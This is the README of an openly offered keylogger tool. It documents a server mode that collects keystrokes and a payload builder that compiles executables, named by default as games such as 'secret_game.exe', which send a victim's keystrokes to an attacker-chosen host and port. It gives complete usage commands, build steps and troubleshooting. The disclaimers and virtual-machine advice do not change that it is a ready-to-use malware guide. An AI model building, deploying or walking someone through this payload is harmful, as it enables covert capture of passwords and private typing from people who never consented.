# Reverse Keylogger - All in One File 🕵️‍♂️

> **Warning:** For educational use only. Unauthorized or unethical use is illegal. Read the Ethical Use section below. 🚨

---

## Overview 📖

This All-in-One (AIO) version contains a complete Proof of Concept (PoC) keylogger in a single Python file. It demonstrates a reverse keylogger architecture that captures keystrokes on a remote host and forwards them to a central server. The code is provided strictly for learning and research in controlled environments.

**🎯 Why All-in-One Version?**
- **Single File:** Everything in one Python script - no multiple files.
- **Easy to Use:** Just download and run - no complex setup.
- **Portable:** Perfect for demonstrations and quick testing.
- **Same Features:** All functionality of the multi-file version.

---

## Features 🌟

- **Server Mode (SM):** Receives keystrokes in real-time from connected clients.
- **Payload Creation (CP):** Generates standalone executables using PyInstaller.
- **Flexible Configuration:** Command-line arguments for all settings.
- **Clean Operation:** Automatic cleanup of temporary files.
- **Cross-Platform:** Works on Windows and Linux.

---

## Quick Start 🚀

### 1. Install Dependencies

```bash
pip install keyboard pyinstaller
```

### 2. Run Directly

**Server Mode (Receive Keystrokes):**

```bash
python keylogger_in_one_file.py -M SM -H 0.0.0.0 -p 4444 -o captured.log
```

**Create Payload (Generate Executable):**

```bash
python keylogger_in_one_file.py -M CP -H 192.168.1.100 -p 4444 -n my_payload.py
```

---

## Command Line Arguments ⚙️

| Argument | Description | Required | Default |
|---|---:|:---:|:---:|
| `-M`, `--mode` | Operation mode: `SM` (Server) or `CP` (Create Payload) | ✅ Yes | - |
| `-H`, `--host` | Host address for server/payload | ❌ No | `0.0.0.0` |
| `-p`, `--port` | Port number (1-65535) | ✅ Yes | - |
| `-n`, `--name` | Output filename for payload | ❌ No | `game.py` |
| `-o`, `--output` | File to save captured keystrokes | ❌ No | - |

---

## Usage Examples 🎯

**Example 1: Basic Server**

```bash
python keylogger_in_one_file.py -M SM -p 4444
```

Listens on all interfaces, port 4444, prints keystrokes to console.

**Example 2: Server with Log File**

```bash
python keylogger_in_one_file.py -M SM -H 0.0.0.0 -p 4444 -o keystrokes.txt
```

Saves all captured keystrokes to `keystrokes.txt`.

**Example 3: Create Payload**

```bash
python keylogger_in_one_file.py -M CP -H 10.0.0.5 -p 4444 -n secret_game.py
```

Creates `secret_game.exe` that connects to `10.0.0.5:4444`.

---

## File Structure 📁

```
keylogger_in_one_file.py    # Complete application in one file
requirements.txt           # Python dependencies
```

**Classes in the Single File:**
- `KeyloggerConfig` - Handles command line arguments
- `PayloadCreator` - Creates and compiles payload executables
- `ServerMode` - Receives and logs keystrokes
- `KeyloggerApp` - Main application coordinator

---

## How It Works 🔧

**Server Mode:**
- Binds to specified host and port
- Waits for client connections
- Receives and logs keystrokes in real-time
- Optionally saves to file

**Payload Creation:**
- Generates Python payload script with target settings
- Uses PyInstaller to compile to executable
- Cleans up temporary build files
- Outputs standalone .exe (Windows) or binary (Linux)

---

## Requirements 🛠️

- **Python 3.8+**

Required Packages:

```bash
pip install keyboard pyinstaller
```

Built-in Libraries Used: `socket`, `argparse`, `pathlib`, `subprocess`, `shutil`, `os`, `time`

---

## AIO vs Multi-File Version 🤔

| Aspect | All-in-One | Multi-File |
|---|:---:|:---:|
| Setup | ✅ Single file | ⚠️ Multiple files |
| Portability | ✅ Excellent | ⚠️ Good |
| Learning | ⚠️ All code together | ✅ Organized structure |
| Development | ⚠️ Harder to modify | ✅ Easy to extend |
| Usage | ✅ Quick testing | ✅ Long-term projects |

**Choose AIO** if you want quick testing, demonstrations, or simple usage.

**Choose Multi-File** if you're learning code structure or planning to extend.

---

## Testing in Safe Environment 🧪

**Recommended Setup:**
- Virtual Machine (VirtualBox, VMware)
- Isolated Network (Host-only or NAT network)
- Test on Same Machine (Use `127.0.0.1` for both server and payload)

**Quick Test:**

```bash
# Terminal 1 - Start Server
python keylogger_in_one_file.py -M SM -H 127.0.0.1 -p 4444

# Terminal 2 - Create and Test Payload
python keylogger_in_one_file.py -M CP -H 127.0.0.1 -p 4444 -n test.py
```

---

## Ethical Use & Legal Disclaimer ⚠️

- **Educational Purpose Only:** This tool is for learning about cybersecurity concepts in controlled environments.
- **Authorization Required:** Only use on systems you own or have explicit permission to test.
- **Legal Responsibility:** Users are solely responsible for how they use this software.
- **Isolation Recommended:** Always use in virtual machines or isolated lab environments.

---

## Troubleshooting 🔧

**Common Issues:**
- `keyboard` module not found

```bash
pip install keyboard
```

- `pyinstaller` not found (Payload creation only)

```bash
pip install pyinstaller
```

- `Permission denied` (Linux)

```bash
# Run with sudo for keyboard access
sudo python keylogger_in_one_file.py -M SM -p 4444
```

- Connection refused
  - Check firewall settings
  - Verify IP address and port
  - Ensure server is running before payload

---

## Support 🙌

For issues with this All-in-One version:
- Check the troubleshooting section above
- Ensure all dependencies are installed
- Test in isolated environment first
- Review command line arguments

---

## Pro Tips 🔍

- Start Simple: Test with `127.0.0.1` first before using real networks
- Use VM: Always test in virtual machines
- Monitor Resources: Keyloggers can be detected by antivirus software
- Learn Responsibly: Understand the code, don't just run it blindly

---

## License 📄

This project is released under the MIT License. Educational use only.

---